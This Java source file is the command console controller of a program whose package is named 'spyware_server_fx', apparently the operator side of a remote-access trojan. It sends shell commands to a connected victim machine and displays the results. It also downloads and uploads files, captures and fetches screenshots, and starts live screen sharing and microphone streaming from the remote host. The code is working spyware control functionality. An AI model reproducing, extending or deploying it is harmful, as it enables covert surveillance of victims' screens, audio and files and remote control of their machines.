package com.example.spyware_server_fx;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.ScrollEvent;
import javafx.scene.layout.Pane;

import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.ResourceBundle;
import java.util.Scanner;

public class CmdController implements Initializable{

    public final String logDirecotryPath = "logs";
    @FXML
    public Pane main_panel;

//    @FXML
//    private ScrollPane scrollPane;
    @FXML
    public TextArea output_cmd;
    @FXML
    public TextField inputField;
    @FXML
    public Button sendBtn;

    public HelloController helloController;
    public ScreenReceiver screenReceiver = null;
    public AudioReceiver audioReceiver = null;
    public volatile boolean isAudioRunning = false;
    public RandomAccessFile logFile;
    public CmdController thisCmdCotroller = null;
    public ArrayList<String> commandsStack;
    public int currentCmdIndexFromStack = -1;
    public final String helpFilesDirecotry = "sourceFiles/helpFiles/";
    public final String helpFilePath = "sourceFiles/help.txt";
    public CmdController(HelloController helloController){
        System.out.println("COnstructor of CMD COntroller called");

        this.helloController = helloController;
        this.thisCmdCotroller = this;
        commandsStack = new ArrayList<String>();
    }
    public void initialize(URL location, ResourceBundle resources){
        // creating a log file
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd_HH_mm_ss");
        String formattedDateTime = now.format(formatter);

        createDirectory(logDirecotryPath);

        try {
            String logFilePath = logDirecotryPath+"/"+formattedDateTime+".txt";
            logFile = new RandomAccessFile(logFilePath, "rw");
            appendlnOutputCmdText("Log File created : "+logFilePath);
            logFile.writeBytes("Initial\n");
        } catch (IOException e) {
            System.out.println("An error occurred while writing to the file: " + e.getMessage());
        }

    }
    public
    @FXML
    void on_input_field_entered(ActionEvent event) {
        String command_original = inputField.getText();
        inputField.setText("");
        addCmd(command_original);
        sendCmd(command_original , null);
    }
    @FXML
    void on_input_field_key_pressed(KeyEvent event) {
        if (event.getCode() == KeyCode.UP) {
            System.out.println("Up key Pressed");

            if (commandsStack.size() > 0) {
                if (currentCmdIndexFromStack >= 0) {
                    System.out.println("Setting this cmd : " + commandsStack.get(currentCmdIndexFromStack));
                    inputField.setText(commandsStack.get(currentCmdIndexFromStack));
                    currentCmdIndexFromStack -= 1;
                    if (currentCmdIndexFromStack < 0)
                        currentCmdIndexFromStack = 0;
                }
            }
        }
        else if (event.getCode() == KeyCode.DOWN) {
                System.out.println("Down key Pressed");

                if (commandsStack.size() > 0) {
                    if (currentCmdIndexFromStack >= 0) {
                        System.out.println("Setting this cmd : " + commandsStack.get(currentCmdIndexFromStack));
                        inputField.setText(commandsStack.get(currentCmdIndexFromStack));
                        currentCmdIndexFromStack += 1;
                        if(currentCmdIndexFromStack >= commandsStack.size())
                            currentCmdIndexFromStack = commandsStack.size() -1;
                    }
                }
            }
    }

    @FXML
    void on_send_cmd_btn_pressed(ActionEvent event) {
        String command_original = inputField.getText();
        addCmd(command_original);
        inputField.setText("");
        sendCmd(command_original.trim() , null);
    }
    public void addCmd(String cmd){
        commandsStack.add(cmd.trim());
        currentCmdIndexFromStack = commandsStack.size()-1;
        System.out.println(commandsStack);
    }
    public interface Callback {
        void callbackFn();
    }
    void sendCmd(String command_original ,Callback callback) {
        System.out.println("SendCmd triggered");

        if(command_original.equals("clear")){
            output_cmd.setText("");
            return;
        }
        appendlnOutputCmdText("\n\n----- " + command_original + " >>");
        if(command_original.equals("help")){
            showHelpOnOutputCmd();
            return;
        }

        if(command_original.endsWith("--help") || command_original.endsWith("-h")){
            showSpecificHelpOnOutputCmd(command_original);
            return;
        }

        String command = command_original + helloController.server.endIdentifier;
        System.out.println("Sending command : " + command);


        if(command_original.equals("dir_gui")){
            helloController.server.getFilesList();
            return;
        }

        // You can now use the clientSocket to send and receive data with the client
        Thread cmdThread = new Thread(new Runnable() {
            public void run() {
                System.out.println("Inside sendCmd thread");
                try {
                    inputField.setEditable(false);
                    sendBtn.setDisable(true);
                    while (!helloController.server.is_socket_free) {
                        System.out.println("Socket not free for sendCmd()");
                        try {
                            Thread.sleep(500);
                        } catch (Exception e) {
                            System.out.println(e.getMessage());
                        }
                    }

                    helloController.server.is_socket_free = false;
                    if(!command_original.startsWith("upload"))
                        helloController.server.outputStream.write(command.getBytes());


                    // now wait for cmd result
                    System.out.println("Cmd Send , now waitting for response");

                    if (command_original.startsWith("download") ) {

                        String filename = command_original.substring(9,command_original.length());

                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        System.out.println(cmdResult);
                        if(cmdResult.equals("sending"))
                                helloController.server.receiveAndSaveFile(filename);
                        else{
                            String error = helloController.server.receiveData(helloController.server.inputStream);
                            appendlnOutputCmdText("Failed to download file : "+filename);
                            appendlnOutputCmdText(error);
                        }
                            helloController.server.is_socket_free = true;
                    }
                    else if(command_original.equals("screenshot")){
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        if(cmdResult.startsWith("<taken>")){
                            String imgPath = cmdResult.substring(7 , cmdResult.length());
                            helloController.cmd_controller.appendlnOutputCmdText("ScreenShot taken ... now downloading screenshot");
                          helloController.server.is_socket_free = true;
                            sendCmd("download " + imgPath, new Callback() {
                                @Override
                                public void callbackFn() {
                                    try {
                                        File file = new File(imgPath);
                                        String currentDirectory = System.getProperty("user.dir");

                                        String[] command = {"cmd", "/c", "start", "", file.getName()};
                                        ProcessBuilder builder = new ProcessBuilder(command);
                                        builder.directory(new File(currentDirectory+File.separator+helloController.server.directoryName+File.separator+helloController.server.screenshotsDirectoryName));
                                        Process process = builder.start();
                                    }
                                    catch (Exception e){
                                        System.out.println("Failed to run file");
                                        System.out.println(e.getMessage());
                                    }
                                }
                            });
                            return;
                        }
                    }
                    else if(command_original.startsWith("upload")){
                        String argsStr = command_original.substring(6,command_original.length());
                        argsStr = argsStr.trim();
                        argsStr = argsStr.replaceAll("\\s+", " ");
                        String[] args = argsStr.split(" ");
                        String remotePath = "";
                        String localPath = "";
                        Boolean temp = false;
                        if(argsStr.contains("temp"))
                            temp = true;
                        if(argsStr.contains("localpath=")) {
                            for (String arg : args) {
                                if (arg.startsWith("remotepath=")) {
                                    remotePath = arg.substring(11, arg.length());
                                } else if (arg.startsWith("localpath=")) {
                                    localPath = arg.substring(10, arg.length());
                                }
                            }
                        }
                        else{
                            localPath = args[0];
                            if(args.length >= 2 && !args[1].equals("temp"))
                                remotePath = args[1];
                        }
                        if(remotePath.equals("")){
                            remotePath = helloController.server.getAbsoluteFilePath(localPath);
                            remotePath = (new File(remotePath)).getName();
                        }

                        try {
                            byte[] fileBytes = helloController.server.readFileBytes(localPath);
                            helloController.server.sendFile(fileBytes , remotePath , temp);
                            String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                            if(cmdResult.startsWith("ok"))
                                helloController.cmd_controller.appendlnOutputCmdText("File uploaded to "+ cmdResult.substring(2,cmdResult.length()));
                            else
                                helloController.cmd_controller.appendlnOutputCmdText(cmdResult);

                        }
                        catch (Exception e){
                            helloController.cmd_controller.appendlnOutputCmdText("Failed to upload file");
                            helloController.cmd_controller.appendlnOutputCmdText(e.getMessage());
                            System.out.println(e.getMessage());

                        }
                        finally {
                            helloController.server.is_socket_free = true;
                        }
                    }
                    else if(command_original.startsWith("screenshare start")){
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        helloController.server.is_socket_free = true;

                        String[] tokens = command_original.split(" ");
                        int port = 8050;
                        try {
                            port = Integer.parseInt(tokens[2]);
                        }
                        catch (Exception e){
                            System.out.println("Failed to get port... Setting default port to 8050");
                        }
                        screenReceiver = new ScreenReceiver(port);
                        screenReceiver.start();
                        appendlnOutputCmdText(cmdResult);
                    }
                    else if(command_original.startsWith("screenshare stop")){
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        screenReceiver.stopReceiving();
                        helloController.server.is_socket_free = true;
                        appendlnOutputCmdText(cmdResult);
                    }
                    else if(command_original.startsWith("mic_stream start")) {
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        helloController.server.is_socket_free = true;

                        String[] tokens = command_original.split(" ");
                        int port = 8030;
                        try {
                            port = Integer.parseInt(tokens[2]);
                        } catch (Exception e) {
                            System.out.println("Failed to get port... Setting default port to 8030");
                        }
                        audioReceiver = new AudioReceiver(port , thisCmdCotroller);
                        audioReceiver.startReceiving();
                        appendOutputCmdText(cmdResult);
                    }
                    else if(command_original.startsWith("mic_stream stop")){
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                        audioReceiver.stopReceiving();
                        helloController.server.is_socket_free = true;
                        appendlnOutputCmdText(cmdResult);
                    }
                    else{
                        String cmdResult = helloController.server.receiveData(helloController.server.inputStream);
                    helloController.server.is_socket_free = true;
                    appendlnOutputCmdText(cmdResult);
                    System.out.println("Response written to outputCmd");
                    }

                        inputField.setEditable(true);
                        sendBtn.setDisable(false);

                        if(command_original.startsWith("cd")){
                            helloController.gui_controller.getAndShowData();
                        }

                }
                catch (Exception e){
                    System.out.println(e.getMessage());
                    appendlnOutputCmdText(e.getMessage());
                    helloController.server.is_socket_free = true;
                }
                finally {
                    if(callback != null)
                        callback.callbackFn();
                }
//                try {
//                    if (server.clientSocket.isConnected()) {
//                        String command = inputField.getText();
//                        command += server.endIdentifier;
//                        System.out.println("Sendig coomand : " + command);
//                        server.outputStream.write(command.getBytes());
//                        // now wait for cmd result
//                        inputField.setEditable(false);
//                        sendBtn.setDisable(true);
//
//                        String cmdResult = server.receiveData(server.clientSocket.getInputStream());
//                        System.out.println(cmdResult);
//
//                        inputField.setEditable(true);
//                        sendBtn.setDisable(false);
//                    } else
//                        throw new Exception("Client is not connected");
//                }

        }});
        cmdThread.start();

    }


    public void appendOutputCmdText(String text){
        output_cmd.appendText(text);
        try {
            logFile.writeBytes(text);
            System.out.println("Logged to file");
        }
        catch (Exception e){
            System.out.println("Failed to log to file");
        }
        System.out.println("Text written to the file successfully.");
    }
    public void appendlnOutputCmdText(String text){
        appendOutputCmdText(text+"\n");
    }
    public void createDirectory(String directoryPath){

        // Create a Path object from the directory path
        Path directory = Paths.get(directoryPath);

        // Check if the directory exists
        if (!Files.exists(directory)) {
            try {
                // Create the directory
                Files.createDirectories(directory);
                System.out.println("Directory created: " + directory);
            } catch (Exception e) {
                System.err.println("Failed to create directory: " + e.getMessage());
            }
        } else {
            System.out.println("Directory already exists: " + directory);
        }
    }
    public void showHelpOnOutputCmd(){

        try (BufferedReader reader = new BufferedReader(new FileReader(helpFilePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                appendlnOutputCmdText(line);
            }
        } catch (IOException e) {
            System.out.println("An error occurred while reading the file: " + e.getMessage());
        }
    }
    public void showSpecificHelpOnOutputCmd(String command){
        System.out.println("Showinf specific help for");
        command = (command.split("--help|-h")[0]).trim();

        try (BufferedReader reader = new BufferedReader(new FileReader(helpFilesDirecotry+command+".txt"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                appendlnOutputCmdText(line);
            }
        } catch (IOException e) {
            System.out.println("An error occurred while reading the file: " + e.getMessage());
            appendOutputCmdText("Wait for next version. Help for this command has not been made yet");
        }
    }

}